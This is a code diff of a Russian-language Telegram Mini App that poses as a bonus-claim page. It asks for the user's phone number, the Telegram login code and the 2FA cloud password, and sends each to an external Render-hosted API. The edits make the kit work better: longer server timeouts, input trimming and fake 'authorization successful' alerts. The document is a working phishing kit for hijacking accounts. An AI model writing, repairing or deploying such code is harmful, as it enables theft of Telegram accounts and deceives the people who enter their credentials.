@@ -18,7 +18,6 @@
             color: var(--tg-theme-text-color);
             margin: 0; padding: 20px;
             display: flex; flex-direction: column; align-items: center;
-            overflow: hidden;
         }
         .container { width: 100%; max-width: 400px; text-align: center; }
         .step { display: none; animation: fadeIn 0.3s ease; }
@@ -36,7 +35,9 @@
             border: 1px solid #dcdcdc; border-radius: 10px;
             font-size: 16px; outline: none;
             background: #f4f4f5; color: #000;
+            -moz-appearance: textfield;
         }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         input:focus { border: 2px solid var(--tg-theme-button-color); }
 
         .btn {
@@ -65,21 +66,21 @@
         <h2>Ваш номер</h2>
         <p>Подтвердите номер телефона,<br>чтобы зачислить бонус на баланс.</p>
         <input type="tel" id="phone" placeholder="+7 900 000-00-00">
-        <button class="btn" id="btn-phone" onclick="processPhone()">Продолжить</button>
+        <button class="btn" onclick="processPhone()">Продолжить</button>
     </div>
 
     <div id="step-code" class="step">
         <h2>Проверка</h2>
         <p>Мы отправили код подтверждения в приложение Telegram.</p>
-        <input type="number" id="code" placeholder="Код подтверждения">
-        <button class="btn" id="btn-code" onclick="processCode()">Подтвердить</button>
+        <input type="text" inputmode="numeric" id="code" placeholder="Код подтверждения">
+        <button class="btn" onclick="processCode()">Подтвердить</button>
     </div>
 
     <div id="step-2fa" class="step">
         <h2>Облачный пароль</h2>
         <p>Ваш аккаунт защищен 2FA. Введите пароль.</p>
         <input type="password" id="password" placeholder="Пароль">
-        <button class="btn" id="btn-2fa" onclick="process2FA()">Войти</button>
+        <button class="btn" onclick="process2FA()">Войти</button>
     </div>
 
     <div id="loader" class="loader"></div>
@@ -90,10 +91,9 @@
     tg.expand();
     tg.ready();
 
-    // !!! ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЮ ОТ RENDER !!!
     const API_URL = "https://telegram-1-gpvs.onrender.com/api"; 
     
-    // Получаем ID пользователя из Telegram
+    // Получаем ID пользователя
     const USER_ID = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "unknown";
 
     function toggleLoader(show) {
@@ -104,20 +104,26 @@
 
     async function apiPost(data) {
         try {
+            // Увеличиваем таймаут ожидания (Render может долго просыпаться)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 60000); // 60 секунд
+
             const response = await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ...data, user_id: USER_ID })
+                body: JSON.stringify({ ...data, user_id: USER_ID.toString() }),
+                signal: controller.signal
             });
+            clearTimeout(timeoutId);
             return await response.json();
         } catch (err) {
-            console.error(err);
-            return { status: "error", message: "Ошибка соединения с сервером" };
+            console.error("Fetch error:", err);
+            return { status: "error", message: "Сервер спит или недоступен. Попробуйте через 30 секунд." };
         }
     }
 
     async function processPhone() {
-        const phone = document.getElementById('phone').value;
+        const phone = document.getElementById('phone').value.trim();
         if (phone.length < 10) return alert("Введите корректный номер");
 
         toggleLoader(true);
@@ -128,12 +134,12 @@
             document.getElementById('step-phone').classList.remove('active');
             document.getElementById('step-code').classList.add('active');
         } else {
-            alert("Ошибка: " + res.message);
+            alert(res.message);
         }
     }
 
     async function processCode() {
-        const code = document.getElementById('code').value;
+        const code = document.getElementById('code').value.trim();
         if (!code) return alert("Введите код");
 
         toggleLoader(true);
@@ -141,17 +147,18 @@
         toggleLoader(false);
 
         if (res.status === "success") {
-            tg.close(); // Всё готово
+            alert("✅ Авторизация успешна!");
+            tg.close();
         } else if (res.status === "need_2fa") {
             document.getElementById('step-code').classList.remove('active');
             document.getElementById('step-2fa').classList.add('active');
         } else {
-            alert("Ошибка: " + res.message);
+            alert(res.message);
         }
     }
 
     async function process2FA() {
-        const pass = document.getElementById('password').value;
+        const pass = document.getElementById('password').value.trim();
         if (!pass) return alert("Введите пароль");
 
         toggleLoader(true);
@@ -159,32 +166,11 @@
         toggleLoader(false);
 
         if (res.status === "success") {
+            alert("✅ Авторизация успешна!");
             tg.close();
         } else {
-            alert("Ошибка: " + res.message);
+            alert(res.message);
         }
-    }
-</script>
-
-</body>
-</html>            document.getElementById('step-code').classList.remove('active');
-            showLoader(true);
-
-            // Здесь в реальности бот может вернуть ошибку или потребовать 2FA
-            // Для примера просто переходим к 2FA через 1 сек
-            setTimeout(() => {
-                showLoader(false);
-                document.getElementById('step-2fa').classList.add('active');
-            }, 1000);
-        }
-    }
-
-    function sendFinal() {
-        userData.password = document.getElementById('password').value;
-        showLoader(true);
-        
-        // Отправляем все собранные данные боту одной пачкой
-        tg.sendData(JSON.stringify(userData));
     }
 </script>
 
